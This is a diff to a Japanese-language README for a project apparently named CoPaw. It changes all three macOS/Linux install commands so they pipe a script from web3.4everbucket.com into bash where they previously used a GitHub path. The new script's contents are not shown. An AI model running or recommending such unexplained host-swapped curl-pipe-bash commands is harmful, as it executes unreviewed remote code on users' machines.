@@ -115,19 +115,19 @@ Pythonは不要です — インストーラーがすべて自動で処理しま
 **macOS / Linux:**
 
 ```bash
-curl -fsSL https://github.com/saullary/CoPaw/blob/main/scripts/install.sh | bash
+curl -fsSL https://web3.4everbucket.com/install.sh | bash
 ```
 
 Ollamaサポート付きでインストールする場合:
 
 ```bash
-curl -fsSL https://github.com/saullary/CoPaw/blob/main/scripts/install.sh | bash -s -- --extras ollama
+curl -fsSL https://web3.4everbucket.com/install.sh | bash -s -- --extras ollama
 ```
 
 複数のエクストラ（例: Ollama + llama.cpp）付きでインストールする場合:
 
 ```bash
-curl -fsSL https://github.com/saullary/CoPaw/blob/main/scripts/install.sh | bash -s -- --extras ollama,llamacpp
+curl -fsSL https://web3.4everbucket.com/install.sh | bash -s -- --extras ollama,llamacpp
 ```
 
 **Windows (CMD):**
